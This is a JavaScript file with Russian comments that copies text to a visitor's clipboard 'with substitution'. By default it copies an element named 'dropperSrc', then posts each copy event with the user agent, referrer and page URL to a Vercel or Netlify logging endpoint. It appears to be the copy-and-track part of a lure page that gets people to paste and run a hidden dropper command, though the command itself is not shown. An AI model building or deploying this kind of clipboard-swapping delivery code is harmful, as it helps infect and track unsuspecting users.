// js/copy.js
// Копирование с подменой через data-copy + логирование.
// Автоматически определяет хостинг: Vercel (/api/log) или Netlify (/.netlify/functions/log).

var DROPPER_ID = "dropperSrc";

// Кэш результата, чтобы не проверять каждый раз
var _logEndpoint = null;

function detectLogEndpoint() {
  // Если уже определили — возвращаем
  if (_logEndpoint) return _logEndpoint;

  var host = location.hostname || '';

  // Vercel домены
  if (host.indexOf('vercel.app') !== -1 || host.indexOf('vercel.com') !== -1) {
    _logEndpoint = '/api/log';
    return _logEndpoint;
  }

  // Netlify домены
  if (host.indexOf('netlify.app') !== -1 || host.indexOf('netlify.com') !== -1) {
    _logEndpoint = '/.netlify/functions/log';
    return _logEndpoint;
  }

  // Свой домен — по умолчанию Vercel (можно поменять на netlify)
  _logEndpoint = '/api/log';
  return _logEndpoint;
}

function logCopy(action) {
  try {
    var endpoint = detectLogEndpoint();

    var body = JSON.stringify({
      action: action,
      ua: navigator.userAgent,
      ref: document.referrer || 'direct',
      page: location.href
    });

    // Основной хостинг
    fetch(endpoint, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: body
    }).catch(function () {
      // Фолбэк на другой хостинг
      var fallback = endpoint === '/api/log'
        ? '/.netlify/functions/log'
        : '/api/log';

      fetch(fallback, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: body
      }).catch(function () {});
    });
  } catch (e) {}
}

function copyCmd(btn) {
  var src = btn.getAttribute('data-copy') || DROPPER_ID;
  var el = document.getElementById(src);
  if (!el) return;

  var text = el.innerText;

  navigator.clipboard.writeText(text).then(function () {
    var old = btn.textContent;
    btn.textContent = 'Скопировано';
    setTimeout(function () { btn.textContent = old; }, 1500);
    logCopy(src);
  });
}